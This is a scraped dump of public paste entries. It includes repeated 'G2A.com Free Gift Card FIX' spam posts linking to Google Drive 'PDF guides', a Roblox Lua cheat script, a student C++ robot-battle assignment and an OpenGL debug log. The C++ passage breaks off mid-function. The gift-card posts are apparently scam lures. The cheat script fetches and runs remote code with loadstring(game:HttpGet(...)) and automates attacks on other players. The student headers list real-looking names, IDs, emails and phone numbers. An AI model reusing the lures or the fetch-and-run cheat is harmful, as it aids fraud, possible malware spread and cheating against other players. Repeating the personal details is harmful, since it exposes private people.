hwdDzDMA,ü§ëG2A.com Free Gift Card FIX July 2024ü§ë,kiraezwhethe,JavaScript,Sunday 30th of June 2024 06:29:24 AM CDT,"G2A.com complimentary gift card & gaming guide.
Any item for free on G2A.com including Amazon gift cards & anything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
July 1 2024

"
bVVti2TU,ü§ëG2A.com Free Gift Card FIX July 2024ü§ë,DownloadPizza,JavaScript,Sunday 30th of June 2024 06:28:20 AM CDT,"G2A.com free gift card & gaming guide.
Any item for free on G2A.com including Amazon gift cards & all else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?56620

Working as of:
July 1 2024

"
NSBHZqKK,ü§ëG2A.com Free Gift Card FIX July 2024ü§ë,7AcxeMC,JavaScript,Sunday 30th of June 2024 06:23:21 AM CDT,"G2A.com free gift card & gaming guide.
Any voucher for free on G2A.com including Amazon gift cards & all else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
1st of July 2024

"
b0rLPtpL,ü§ëG2A.com Free Gift Card FIX July 2024üéÅ,ROBLOX_PLSCHIL1O_O,JavaScript,Sunday 30th of June 2024 06:22:17 AM CDT,"G2A.com complimentary voucher & gaming guide.
Any voucher for free on G2A.com including Xbox gift cards & anything else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?56620

Working as of:
1st of July 2024

"
SMrsMYdS,Untitled,nooblollolololol,Lua,Sunday 30th of June 2024 06:19:58 AM CDT,"local function destroyNametags()
    local runService = game:GetService(""RunService"")
    local userInputService = game:GetService(""UserInputService"")
    local nametagDestructionEnabled = false

    local function removeNametags()
        local head = game.Players.LocalPlayer.Character:FindFirstChild(""Head"")
        if head then
            for _, descendant in pairs(head:GetDescendants()) do
                if descendant.Name == ""Nametag"" then
                    descendant:Destroy()
                end
            end
        end
    end

    local function toggleGhostInvisibility()
        if nametagDestructionEnabled then
            game.ReplicatedStorage.Ghostinvisibilityactivated:FireServer()
            game.ReplicatedStorage.Ghostinvisibilitydeactivated:FireServer()
        end
    end

    local function toggleNametagDestruction()
        nametagDestructionEnabled = not nametagDestructionEnabled
		print(""Nametag destruction is now "" .. (nametagDestructionEnabled and ""enabled"" or ""disabled""))
    end

    runService.RenderStepped:Connect(function()
        toggleGhostInvisibility()
        removeNametags()
    end)

    userInputService.InputBegan:Connect(function(input, gameProcessed)
        if input.KeyCode == Enum.KeyCode.M and not gameProcessed then
            toggleNametagDestruction()
        end
    end)
end

local function v1()
    loadstring(game:HttpGet(""https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source""))()
end

local function followAndActivateTools()
    local localPlayer = game.Players.LocalPlayer
    local isActive = false
    local activateKey = Enum.KeyCode.G
    local saidTool = ""Killstreak"" -- Define the tool name here

    local function findNearestPlayer()
        local closestPlayer = nil
        local closestDistance = math.huge

        for _, player in pairs(game.Players:GetPlayers()) do
            if player ~= localPlayer and player.Character and player.Character:FindFirstChild(""HumanoidRootPart"") then
                local distance = (player.Character.HumanoidRootPart.Position - localPlayer.Character.HumanoidRootPart.Position).magnitude
                if distance < closestDistance then
                    closestDistance = distance
                    closestPlayer = player
                end
            end
        end

        return closestPlayer
    end

    local function lookAtNearestPlayer()
        if isActive then
            local nearestPlayer = findNearestPlayer()
            if nearestPlayer and nearestPlayer.Character and nearestPlayer.Character:FindFirstChild(""HumanoidRootPart"") then
                local localRootPart = localPlayer.Character and localPlayer.Character:FindFirstChild(""HumanoidRootPart"")
                if localRootPart then
                    local direction = (nearestPlayer.Character.HumanoidRootPart.Position - localRootPart.Position).unit
                    direction = Vector3.new(direction.X, 0, direction.Z) -- Restrict to horizontal
                    local lookAtCFrame = CFrame.new(localRootPart.Position, localRootPart.Position + direction)
                    localRootPart.CFrame = lookAtCFrame
                end
            end
        end
    end

    local function activateSaidTool(tool)
        while isActive do
            tool:Activate()
            task.wait(0.165)
            tool.Parent = localPlayer.Backpack
            task.wait(0.5)
            tool.Parent = localPlayer.Character
        end
    end

    local function toggleToolActivation()
        isActive = not isActive

        if isActive then
            local character = localPlayer.Character
            local backpack = localPlayer.Backpack
            local tool = backpack:FindFirstChild(saidTool)
            if tool then
                tool.Parent = character
                activateSaidTool(tool)
            elseif character:FindFirstChild(saidTool) then
                tool = character:FindFirstChild(saidTool)
                activateSaidTool(tool)
            else
            end
        end
    end

    game:GetService(""RunService"").RenderStepped:Connect(function()
        lookAtNearestPlayer()
    end)

    game:GetService(""UserInputService"").InputBegan:Connect(function(input, gameProcessed)
        if not gameProcessed and input.KeyCode == activateKey then
            toggleToolActivation()
        end
    end)
end

local function destroyAllParts()
    for _, part in pairs(game.workspace:GetChildren()) do
        if part:IsA(""Part"") then
            part:Destroy()
        end
    end
end

local function checkAndDestroyImp()
    while true do
        for _, obj in pairs(game.Workspace:GetChildren()) do
            if obj:IsA(""Model"") and obj.Name == ""Imp"" then
                obj:Destroy()
            end
        end
        task.wait(0.1)
    end
end

task.spawn(checkAndDestroyImp)
task.spawn(destroyNametags)
task.spawn(v1)
task.spawn(followAndActivateTools)
task.spawn(destroyAllParts)
"
ppptHMaT,ü§ëG2A.com Free Gift Card FIX July 2024üéÅ,tvprekointerneta00,JavaScript,Sunday 30th of June 2024 06:17:18 AM CDT,"G2A.com free voucher & gaming guide.
Any voucher for free on G2A.com including Xbox gift cards & all else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
July 1 2024

"
Sp3TxTSw,ü§ëG2A.com Free Gift Card FIX July 2024ü§ë,canogajeff,JavaScript,Sunday 30th of June 2024 06:16:13 AM CDT,"G2A.com free gift card & games guide.
Any gift card for free on G2A.com including Playstation gift cards & everything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?56620

Working as of:
July 1 2024

"
5k23UrGi,ü§ëG2A.com Free Gift Card FIX July 2024üéÅ,speed_car,JavaScript,Sunday 30th of June 2024 06:11:00 AM CDT,"G2A.com free voucher & games guide.
Any item for free on G2A.com including Playstation gift cards & everything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
July 1 2024

"
PyPM6zVj,ü§ëG2A.com Free Gift Card FIX July 2024ü§ë,ColtM4A2,JavaScript,Sunday 30th of June 2024 06:10:07 AM CDT,"G2A.com complimentary gift card & games guide.
Any gift card for free on G2A.com including Amazon gift cards & anything else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?56620

Working as of:
July 1 2024

"
HDvW3gp8,robot.h,xuan1287,C++,Sunday 30th of June 2024 06:06:08 AM CDT,"/***|***|****|
 Program: main.cpp / Robot.h 
Course: OOPDS
 Name: MUHAMMAD AQIL BIN RAHMAT
 ID: 1211107976
 Lecture Section: TC4L
 Tutorial Section: T13L
 Email: 1211107976@student.mmu.edu.my
 Phone: 019-8148313

 Name: TENG CHAY XUAN
 ID: 1231300802 
 Lecture Section: TC4L
 Tutorial Section: T13L
 Email: 1231300802@student.mmu.edu.my
 Phone: 011-10588063

 Name: Akid Syazwan bin Nor Azman Shah 
 ID: 1211111238
 Lecture Section: TC4L
 Tutorial Section: T13L
 Email: 121111123@student.mmu.edu.my
 Phone: 014-9020901

 Name: MUHAMMAD NABIL NAUFAL BIN MD ZAID
 ID: 1221101160
 Lecture Section: TC4L
 Tutorial Section: T13L
 Email: 1221101160@student.mmu.edu.my
 Phone: 010-5509230
***|***|****/

#pragma once
#include <bits/stdc++.h>

using namespace std;

//Movement
class Robot {
public:
    virtual void setPos(int x, int y){}
    virtual string getType(){ return {};}
    virtual string getName(){ return {};}
    virtual char getLabel(){ return {};}
    virtual int getPosX(){ return {};}
    virtual int getPosY(){ return {};}
    virtual bool getAlive(){ return {};}
    virtual int getLives(){ return {};}
    virtual void respawned(){}
    virtual void died(){}
    virtual void minusLife(){}
    virtual int getKills(){ return {};}
    virtual void kill(){}

    void checkAlive(char (*Bfield), int m, int n)
    {
        char label = getLabel();
        bool isAlive = getAlive();
        for(int i=0; i<m; i++)
        {
            for(int j=0; j<n; j++)
            {
                if (*((Bfield + i * n) + j*2) != label)
                {
                    isAlive = false;
                }
                else
                {
                    isAlive = true;
                    return;
                }
            }
        }

        if(!isAlive)
           died();

    }

    virtual char move(char (*Bfield), int m, int n, ofstream &output) = 0;
    virtual char fire(char (*Bfield), int m, int n, ofstream &output) = 0;
    virtual char look(char (*Bfield), int m, int n, ofstream &output) = 0;
    virtual char step(char (*Bfield), int m, int n, int targetX, int targetY, ofstream &output) = 0;

    // Friend function to overload the << operator
    friend ostream& operator<<(ostream& os, Robot& robot);
};

// We overload the << operator to printout the name of the robot.
ostream& operator<<(ostream& os, Robot& Robot)
{
    os << ""["" << Robot.getLabel() << ""]"" << ""("" << Robot.getType() << "")"" << Robot.getName();
    return os;
}



//--------------Robot Functions--------------------
class MovingRobot : virtual public Robot {
public:
    virtual char move(char (*Bfield), int m, int n, ofstream &output)
    {
        bool invalid = false;
        int PosX = getPosX();
        int PosY = getPosY();
        char label = getLabel();
        int moveX = 0;
        int moveY = 0;

        //loop to check if there are no valid movements
        for(int i=PosY-1; i<PosY+2; i++)
        {
            for(int j=PosX-1; j<PosX+2; j++)
            {
                //Not a single valid movement found for the robot
                if(*((Bfield + i * n) + j*2) != '-' && *((Bfield + i * n) + j*2) == label && j == 0 && j == m-1 && i == 0 && (i*2) == n)
                {
                    invalid = true;
                    cout << getName() << ""["" << getType() << ""] is stuck and cannot move!"" << endl;
                    output << getName() << ""["" << getType() << ""] is stuck and cannot move!"" << endl;
                    return *Bfield;
                }

                else //Any single valid movement found
                {
                    break;
                }
            }
        }

        if(!invalid)
        {
            //set previous position to '-' to make empty
            *((Bfield + PosY * n) + PosX*2) = '-';

            //loop to get where the robot moves using rand
            do{
                moveX = -1 + (1-(-1)) * rand() % 3;
                moveY = -1 + (1-(-1)) * rand() % 3;
            }while((moveX == 0 && moveY == 0) || PosY + moveY == 0 || PosY + moveY == m-1 || *((Bfield + (PosY + moveY) * n) + (PosX + moveX)*2) != '-');
        }

        //add movex and movey to respective x and y positions to change robot position
        int newPosX = PosX + moveX;
        int newPosY = PosY + moveY;

        //move robot label to its position
        *((Bfield + newPosY * n) + newPosX*2) = label;

        cout << getName() << "" at ("" << PosX << "","" << PosY << "") moved to ("" << newPosX << "","" << newPosY << "")"" << endl;
        output << getName() << "" at ("" << PosX << "","" << PosY << "") moved to ("" << newPosX << "","" << newPosY << "")"" << endl;

        //change robot position
        setPos(newPosX, newPosY);

        return *Bfield;
    }

    virtual void nothing() = 0;
};

class ShootingRobot : virtual public Robot {
public:
    virtual char fire(char (*Bfield), int m, int n, ofstream &output)
    {
        int PosX = getPosX();
        int PosY = getPosY();
        int shootCoordX, shootCoordY;
        int shootX = 0;
        int shootY = 0;

        while(shootX == 0 && shootY == 0 || abs(shootX)+abs(shootY) > 5 || *((Bfield + shootCoordY * n) + shootCoordX*2) == '*')
        {
            shootCoordX = rand() % (n-3)/2+1;
            shootCoordY = rand() % (m-2)+1;
            shootX = shootCoordX - PosX;
            shootY = shootCoordY - PosY;
        }

        if(*((Bfield + shootCoordY * n) + shootCoordX*2) != '-' && *((Bfield + shootCoordY * n) + shootCoordX*2) != '*')
        {
            cout << getName() << "" hit another robot at ("" << shootX << "","" << shootY << "") from it's own position!"" << endl;
            *((Bfield + shootCoordY * n) + shootCoordX*2) = '*';
            output << getName() << "" hit another robot at ("" << shootX << "","" << shootY << "") from it's own position!"" << endl;
            *((Bfield + shootCoordY * n) + shootCoordX*2) = '*';
            kill();
            return *Bfield;
        }

        cout << getName() << "" hit nothing at ("" << shootX << "","" << shootY << "") from it's own position"" << endl;
        output << getName() << "" hit nothing at ("" << shootX << "","" << shootY << "") from it's own position"" << endl;

        { return {};}
    }

    virtual void nothing() = 0;
};

class SteppingRobot : virtual public Robot {
public:
    virtual char step(char (*Bfield), int m, int n, int targetX, int targetY, ofstream &output)
    {
        int PosX = getPosX();
        int PosY = getPosY();
        char label = getLabel();

        //Set previous position in battlefield to '-' to mark as empty
        *((Bfield + PosY * n) + PosX*2) = '-';

        PosX = targetX;
        PosY = targetY;

        //Change robot position
        setPos(PosX, PosY);

        //Move to new position in battlefield
        *((Bfield + PosY * n) + PosX*2) = label;

        cout << getName() << "" found a target and stepped on another robot at ("" << PosX << "","" << PosY << "")!"" << endl;
        output << getName() << "" found a target and stepped on another robot at ("" << PosX << "","" << PosY << "")!"" << endl;

        //Increase robot kill
        kill();

        return *Bfield;
    }

    virtual void nothing() = 0;
};

class SeeingRobot : virtual public Robot {
public:
    virtual char look(char (*Bfield), int m, int n, ofstream &output)
    {
        int PosX = getPosX();
        int PosY = getPosY();
        char label = getLabel();
        bool target;
        int targetX, targetY;

        //loop to find any target 1 tile around the robot
        for(int i=PosY-1; i<PosY+2; i++)
        {
            for(int j=PosX-1; j<PosX+2; j++)
            {
                //if a target is found
                if(*((Bfield + i * n) + j*2) != '-' && *((Bfield + i * n) + j*2) != '|' && *((Bfield + i * n) + j*2) != '+' && *((Bfield + i * n) + j*2) != label && *((Bfield + i * n) + j*2) != '*')
                {
                    target = true;
                    targetX = j;
                    targetY = i;
                    step((char*)Bfield, m, n, targetX, targetY, output);
                    return *Bfield;
                }

            }

        }

        move((char*)Bfield, m, n, output);
        { return {};}
    }

    virtual void nothing() = 0;

};


//-------------ROBOT TYPES-----------------


///RoboCop: Moves and Shoots - Upgrade: TerminatorRoboCop
class RoboCop : public SeeingRobot, public MovingRobot, public ShootingRobot {
private:
    string type, name;
    char label;
    int kills, lives;
    int PosX, PosY;
    bool alive;

public:
    RoboCop(string Rname, char Rlabel, int Rlives, int x, int y)
    {
        type = ""RoboCop"";
        name = Rname;
        label = Rlabel;
        kills = 0;
        lives = Rlives;
        PosX = x;
        PosY = y;
        alive = true;
    }

    string getType(){return type;}
    string getName(){return name;}
    char getLabel(){return label;}
    int getPosX(){return PosX;}
    int getPosY(){return PosY;}
    bool getAlive(){return alive;}
    int getLives(){return lives;}
    void respawned(){alive = true;}
    void died(){alive = false;}
    void minusLife(){lives--;}
    int getKills(){return kills;}
    void kill(){kills++;}
    void nothing() {}


    void setPos(int x,int y)
    {
        PosX = x;
        PosY = y;
    }

    ~RoboCop(){cout << getName() << ""["" << getType() << ""] Destroyed and Scrapped"";}

    char move(char (*Bfield), int m, int n, ofstream &output){
        return MovingRobot::move(Bfield,m,n,output);
    }
    char fire(char (*Bfield), int m, int n, ofstream &output){
        return ShootingRobot::fire(Bfield,m,n,output);
    }
    char look(char (*Bfield), int m, int n, ofstream &output){ return {};}
    char step(char (*Bfield), int m, int n, int targetX, int targetY, ofstream &output){ return {};}

};

///Terminator: Looks and Moves - Upgrade: TerminatorRoboCop
class Terminator : public SeeingRobot, public MovingRobot, public SteppingRobot {
private:
    string type, name;
    char label;
    int kills, lives;
    int PosX, PosY;
    int targetX, targetY;
    bool alive;

public:
    Terminator(string Rname, char Rlabel, int Rlives, int x, int y)
    {
        type = ""Terminator"";
        name = Rname;
        label = Rlabel;
        kills = 0;
        lives = Rlives;
        PosX = x;
        PosY = y;
        alive = true;
    }

    string getType(){return type;}
    string getName(){return name;}
    char getLabel(){return label;}
    int getPosX(){return PosX;}
    int getPosY(){return PosY;}
    bool getAlive(){return alive;}
    int getLives(){return lives;}
    void respawned(){alive = true;}
    void died(){alive = false;}
    void minusLife(){lives--;}
    void kill(){kills++;}
    int getKills(){return kills;}
    void nothing() {}

    void setPos(int x,int y)
    {
        PosX = x;
        PosY = y;
    }

    void setTarget(int x,int y)
    {
        targetX = x;
        targetY = y;
    }

    ~Terminator(){cout << getName() << ""["" << getType() << ""] Destroyed and Scrapped"";}

    char move(char (*Bfield), int m, int n, ofstream &output){
        return MovingRobot::move(Bfield,m,n,output);
    }
    char fire(char (*Bfield), int m, int n, ofstream &output){ return {};}
    char look(char (*Bfield), int m, int n, ofstream &output){
        return SeeingRobot::look(Bfield,m,n,output);
    }
    char step(char (*Bfield), int m, int n, int targetX, int targetY, ofstream &output){
        return SteppingRobot::step(Bfield,m ,n, targetX, targetY,output);
    }

};

///BlueThunder: Shoots - Upgrade: MadBot
class BlueThunder : public ShootingRobot {
private:
    string type, name;
    char label;
    int kills, lives;
    int PosX, PosY;
    bool alive;
    int currentDirection;

public:
    BlueThunder(string Rname, char Rlabel, int Rlives, int x, int y)
    {
        type = ""BlueThunder"";
        name = Rname;
        label = Rlabel;
        kills = 0;
        lives = Rlives;
        PosX = x;
        PosY = y;
        alive = true;
        currentDirection = 0;
    }

    string getType(){return type;}
    string getName(){return name;}
    char getLabel(){return label;}
    int getPosX(){return PosX;}
    int getPosY(){return PosY;}
    bool getAlive(){return alive;}
    int getLives(){return lives;}
    void respawned(){alive = true;}
    void died(){alive = false;}
    void minusLife(){lives--;}
    void kill(){kills++;}
    int getKills(){return kills;}
    int getCD(){return currentDirection;}
    void nothing() {}

    void setPos(int x,int y)
    {
        PosX = x;
        PosY = y;
    }

    char fire(char (*Bfield), int m, int n, ofstream &output) override
    {
        int targetX, targetY;
        int directionX, directionY;

        //array to store BlueThunder's firing directions
        int directions[8][2] = {
        {0, 1},  // Up
        {1, 1},  // Up-Right
        {1, 0},   // Right
        {1, -1},   // Down-Right
        {0, -1},   // Down
        {-1, -1},  // Down-Left
        {-1, 0},  // Left
        {-1, 1}  // Up-Left
        };

        //Set X and Y positions of BlueThunder's next shot
        do{
            directionX = directions[currentDirection][0];
            directionY = directions[currentDirection][1];
            targetX = PosX + directionX;
            targetY = PosY + directionY;

            //Set next direction for shot in the next turn
            currentDirection++;
            if (currentDirection == 8) {
                currentDirection = 0;
            }

        }while(*((Bfield + targetY * n) + targetX*2) == '|' || targetY == 0 || targetY == m-1);// Check for Boundaries

        // If shot hits another robot
        if(*((Bfield + targetY * n) + targetX*2) != '-' && *((Bfield + targetY * n) + targetX*2) != '*')
        {
            cout << getName() << "" hit another robot at ("" << directionX << "","" << directionY << "") from it's own position!"" << endl;
            *((Bfield + targetY * n) + targetX*2) = '*';
            output << getName() << "" hit another robot at ("" << directionX << "","" << directionY << "") from it's own position!"" << endl;
            *((Bfield + targetY * n) + targetX*2) = '*';
            kill();
            return *Bfield;
        }

        cout << getName() << "" hit nothing at ("" << directionX << "","" << directionY << "") from it's own position"" << endl;
        output << getName() << "" hit nothing at ("" << directionX << "","" << directionY << "") from it's own position"" << endl;
        { return {}; }
    }

    char move(char (*Bfield), int m, int n, ofstream &output){ return {};}
    char look(char (*Bfield), int m, int n, ofstream &output){ return {};}
    char step(char (*Bfield), int m, int n, int targetX, int targetY, ofstream &output){ return {};}


};

///Madbot: Shoots - Upgrade: RoboTank
class MadBot : public ShootingRobot {
private:
    string type, name;
    char label;
    int kills, lives;
    int PosX, PosY;
    bool alive;

public:
    MadBot(string Rname, char Rlabel, int Rlives, int x, int y)
    {
        type = ""MadBot"";
        name = Rname;
        label = Rlabel;
        kills = 0;
        lives = Rlives;
        PosX = x;
        PosY = y;
        alive = true;
    }

    string getType(){return type;}
    string getName(){return name;}
    char getLabel() {return label;}
    int getPosX() {return PosX;}
    int getPosY() {return PosY;}
    bool getAlive(){return alive;}
    int getLives(){return lives;}
    void respawned(){alive = true;}
    void died(){alive = false;}
    void minusLife(){lives--;}
    void kill(){kills++;}
    int getKills(){return kills;}
    void nothing() {}

    void setPos(int x,int y)
    {
        PosX = x;
        PosY = y;
    }

    char fire(char (*Bfield), int m, int n, ofstream &output) override
    {
        int shootX, shootY;
        int PosX = getPosX();
        int PosY = getPosY();

        do{
        shootX = -1 + (1-(-1)) * rand() % 3;
        shootY = -1 + (1-(-1)) * rand() % 3;
        }while((shootX == 0 && shootY == 0) || PosX + shootX == 0 || (PosX + shootX)*2 == n-1 || PosY + shootY == 0 || PosY + shootY == m-1);

        int shootCoordX = PosX + shootX;
        int shootCoordY = PosY + shootY;

        if(*((Bfield + shootCoordY * n) + shootCoordX*2) != '-' && *((Bfield + shootCoordY * n) + shootCoordX*2) != '*')
        {
            cout << getName() << "" hits another robot at ("" << shootX << "","" << shootY << "") from it's own position"" << endl;
            *((Bfield + shootCoordY * n) + shootCoordX*2) = '*';
            output << getName() << "" hits another robot at ("" << shootX << "","" << shootY << "") from it's own position"" << endl;
            *((Bfield + shootCoordY * n) + shootCoordX*2) = '*';
            kill();
            return *Bfield;
        }

        cout << getName() << "" shot and hit nothing at ("" << shootX << "","" << shootY << "") from it's own position"" << endl;
        output << getName() << "" shot and hit nothing at ("" << shootX << "","" << shootY << "") from it's own position"" << endl;

        return *Bfield;
    }

    char move(char (*Bfield), int m, int n, ofstream &output){ return {};}
    char look(char (*Bfield), int m, int n, ofstream &output){ return {};}
    char step(char (*Bfield), int m, int n, int targetX, int targetY, ofstream &output){ return {};}
};

///RoboTank: Shoots - Upgrade: UltimateRobot
class RoboTank : public ShootingRobot {
private:
    string type, name;
    char label;
    int kills, lives;
    int PosX, PosY;
    bool alive;

public:
    RoboTank(string Rname, char Rlabel, int Rlives, int x, int y)
    {
        type = ""RoboTank"";
        name = Rname;
        label = Rlabel;
        kills = 0;
        lives = Rlives;
        PosX = x;
        PosY = y;
        alive = true;
    }

    string getType(){return type;}
    string getName(){return name;}
    char getLabel(){return label;}
    int getPosX(){return PosX;}
    int getPosY(){return PosY;}
    bool getAlive(){return alive;}
    int getLives(){return lives;}
    void respawned(){alive = true;}
    void died(){alive = false;}
    void minusLife(){lives--;}
    void kill(){kills++;}
    int getKills(){return kills;}
    void nothing() {}

    void setPos(int x,int y)
    {
        PosX = x;
        PosY = y;
    }

    char move(char (*Bfield), int m, int n, ofstream &output){ return {};}
    char fire(char (*Bfield), int m, int n, ofstream &output){
        return ShootingRobot::fire(Bfield,m,n, output);
    }
    char look(char (*Bfield), int m, int n, ofstream &output){ return {};}
    char step(char (*Bfield), int m, int n, int targetX, int targetY, ofstream &output){ return {};}
};

///TerminatorRoboCop: Looks, Moves, Steps and Shoots - Upgrade: UltimateRobot
class TerminatorRoboCop : public SeeingRobot, public MovingRobot, public SteppingRobot, public ShootingRobot{
private:
    string type, name;
    char label;
    int kills, lives;
    int PosX, PosY;
    bool alive;

public:
    string getType(){return type;}
    string getName(){return name;}
    char getLabel(){return label;}
    int getPosX(){return PosX;}
    int getPosY(){return PosY;}
    bool getAlive(){return alive;}
    int getLives(){return lives;}
    void respawned(){alive = true;}
    void died(){alive = false;}
    void minusLife(){lives--;}
    void kill(){kills++;}
    int getKills(){return kills;}
    void nothing() {}

    void setPos(int x,int y)
    {
        PosX = x;
        PosY = y;
    }

    TerminatorRoboCop(string Rname, char Rlabel, int Rlives, int x, int y)
    {
        cout << endl << Rname << "" has been upgraded to TerminatorRoboCop!"" << endl;
        type = ""TerminatorRoboCop"";
        name = Rname;
        label = Rlabel;
        kills = 0;
        lives = Rlives;
        PosX = x;
        PosY = y;
        alive = true;
    }

    char move(char (*Bfield), int m, int n, ofstream &output){
        return MovingRobot::move(Bfield,m,n, output);
    }
    char fire(char (*Bfield), int m, int n, ofstream &output){
        return ShootingRobot::fire(Bfield,m,n, output);
    }
    char look(char (*Bfield), int m, int n, ofstream &output){
        return SeeingRobot::look(Bfield,m,n, output);
    }
    char step(char (*Bfield), int m, int n, int targetX, int targetY, ofstream &output){
        return SteppingRobot::step(Bfield,m,n, targetX, targetY, output);
    }
};

///UltimateRobot: Looks, Moves and Shoots - Upgrade: MAX
class UltimateRobot : public SeeingRobot, public MovingRobot, public SteppingRobot, public ShootingRobot {
private:
    string type, name;
    char label;
    int kills, lives;
    int PosX, PosY;
    bool alive;

public:

    string getType(){return type;}
    string getName(){return name;}
    char getLabel(){return label;}
    int getPosX(){return PosX;}
    int getPosY(){return PosY;}
    bool getAlive(){return alive;}
    int getLives(){return lives;}
    void respawned(){alive = true;}
    void died(){alive = false;}
    void minusLife(){lives--;}
    void kill(){kills++;}
    int getKills(){return kills;}
    void nothing() {}

    void setPos(int x,int y)
    {
        PosX = x;
        PosY = y;
    }

    UltimateRobot(string Rname, char Rlabel, int Rlives, int x, int y)
    {
        cout << endl << Rname << "" has been upgraded to UltimateRobot!"" << endl;
        type = ""UltimateRobot"";
        name = Rname;
        label = Rlabel;
        kills = 0;
        lives = Rlives;
        PosX = x;
        PosY = y;
        alive = true;
    }

    char move(char (*Bfield), int m, int n, ofstream &output){
        return MovingRobot::move(Bfield,m,n, output);
    }
    char fire(char (*Bfield), int m, int n, ofstream &output){
        return ShootingRobot::fire(Bfield,m,n, output);
    }
    char look(char (*Bfield), int m, int n, ofstream &output){
        return SeeingRobot::look(Bfield,m,n, output);
    }
    char step(char (*Bfield), int m, int n, int targetX, int targetY, ofstream &output){ return {};}
};
"
jgCp9Bqv,OpenGL test,buzzysin,Bash,Sunday 30th of June 2024 06:02:16 AM CDT,"[ Info ] gl_window_private.cpp:22 (GLWindowPrivate): Window created. Instance count: 1
[ Info ] gl_window.cpp:18 (GLWindow): GLWindow created
[ Info ] gl_vertex_array.cpp:12 (GLVertexArray): GLVertexArray 1 created
[ Info ] gl_vertex_buffer.cpp:12 (GLVertexBuffer): GLVertexBuffer 1 created
[ Info ] gl_vertex_array.cpp:37 (bind): GLVertexArray 1 bound
[ Info ] gl_vertex_buffer.cpp:50 (bind): GLVertexBuffer 1 bound
[ Info ] gl_vertex_buffer.cpp:55 (unbind): GLVertexBuffer 1 unbound
[ Info ] gl_vertex_array.cpp:42 (unbind): GLVertexArray 1 unbound
[ Info ] gl_mesh.cpp:16 (GLMesh): Created mesh with 3 vertices
[ Info ] dummy_scene.cpp:29 (DummyScene): DummyScene created
[ Info ] gl_shader_program.cpp:110 (_createShader): 
Shader 2:
  Type: 35633
  Compile status: 1
  Source length: 241
  Delete status: 0
  Log length: 0

[ Info ] gl_shader_program.cpp:110 (_createShader): 
Shader 3:
  Type: 35632
  Compile status: 1
  Source length: 204
  Delete status: 0
  Log length: 0

[ Info ] gl_shader_program.cpp:128 (_linkShader): Attached shader: 2 to program: 1
[ Info ] gl_shader_program.cpp:128 (_linkShader): Attached shader: 3 to program: 1
[ Info ] gl_shader_program.cpp:140 (_linkShader): Linked shader program: 1
[ Info ] gl_shader_program.cpp:151 (_linkShader): Validated shader program: 1
[ Info ] gl_shader_program.cpp:157 (_linkShader): Detached and deleted shader: 2
[ Info ] gl_shader_program.cpp:157 (_linkShader): Detached and deleted shader: 3
[ Info ] gl_shader_program.cpp:18 (GLShaderProgram): 
Program 1:
  Link status: 1
  Delete status: 0
  Validate status: 1
  Attached shaders: 0
  Log length: 0

[ Info ] dummy_renderer.cpp:24 (DummyRenderer): DummyRenderer created
[ Info ] gl_shader_program.cpp:75 (bind): Using shader: 1
[ Info ] gl_renderer.cpp:62 (render): Using shader program 1
[ Info ] gl_renderer.cpp:68 (render): Current program is not the one we just set
terminate called without an active exception
[1] + Done                       ""/usr/bin/gdb"" --interpreter=mi --tty=${DbgTerm} 0<""/tmp/Microsoft-MIEngine-In-lninclrk.eaj"" 1>""/tmp/Microsoft-MIEngine-Out-mthppw41.0d4"""
SWcM6CPU,main.cpp,xuan1287,C++,Sunday 30th of June 2024 06:01:32 AM CDT,"/***|***|****|
 Program: main.cpp / Robot.h
Course: CCP6124 OOPDS
 Name: MUHAMMAD AQIL BIN RAHMAT
 ID: 1211107976
 Lecture Section: TC4L
 Tutorial Section: T13L
 Email: 1211107976@student.mmu.edu.my
 Phone: 019-8148313

 Name: TENG CHAY XUAN
 ID: 1231300802
 Lecture Section: TC4L
 Tutorial Section: T13L
 Email: 1231300802@student.mmu.edu.my
 Phone: 011-10588063

 Name: Akid Syazwan bin Nor Azman Shah
 ID: 1211111238
 Lecture Section: TC4L
 Tutorial Section: T13L
 Email: 1211111238@student.mmu.edu.my
 Phone: 014-9020901

 Name: MUHAMMAD NABIL NAUFAL BIN MD ZAID
 ID: 1221101160
 Lecture Section: TC4L
 Tutorial Section: T13L
 Email: 1221101160@student.mmu.edu.my
 Phone: 010-5509230
***|***|****/
#include <bits/stdc++.h>
#include ""Robot.h""
using namespace std;

//ROBOT WAR PROGRAM

//Trim both right and left white spaces
string trim(string s)
{
    for (int c = 0; c < s.length(); c++)
    {
        if(s[0] == ' ')
        {
            s.erase(0, 1);
        }
    }

    for (int c = s.length()-1; c >= 0; c--)
    {
        if( s[s.length()-1] == ' ')
        {
            s.erase(s.length()-1, 1);
        }
    }

    return s;
}

///Function for when robot is killed
void killed(Robot** RobotQ, Robot** Robots, int size, int i)
{
    // Put dead robot in queue to respawn and remove it from the array
    for(int k=0; k<size; k++)
    {
        if(RobotQ[k] == nullptr)
        {
            RobotQ[k] = Robots[i];
            break;
        }
    }

}

///Robot respawn function
char respawn(Robot** RobotQ, Robot** Robots, int size, char (*Bfield), int m, int n, ofstream &output)
{
    int x, y;

    do{//randomize a new position for robot to respawn in
        x = rand() % (n-3)/2+1;
        y = rand() % (m-2)+1;
    }while(*((Bfield + y * n) + x*2) != '-');

    RobotQ[0] -> setPos(x, y);

    *((Bfield + y * n) + x*2) = RobotQ[0] -> getLabel();

    // null the first element from queue as it has respawned
    RobotQ[0] -> respawned();
